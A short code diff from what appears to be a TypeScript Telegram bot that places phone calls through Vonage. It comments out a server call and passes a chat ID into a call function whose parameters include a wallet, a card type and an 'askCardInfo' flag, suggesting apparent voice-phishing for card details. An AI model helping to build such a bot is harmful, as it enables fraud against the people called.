@@ -1,6 +1,6 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
 import { Middleware, Markup } from 'telegraf';
-import { server } from '../server';
+// import { server } from '../server';
 import { C } from '../types';
 import { UK_NUM, US_NUM } from '../utils/constants';
 import { vonageMakeACall } from '../utils/vonage';
@@ -228,7 +228,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
       );
     }
 
-    await server(ctx, chatId);
+    // await server(ctx, chatId);
 
     await vonageMakeACall({
       from,
@@ -238,6 +238,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
       wallet,
       cardType,
       askCardInfo,
+      chatId,
     });
 
     return ctx.wizard.next();
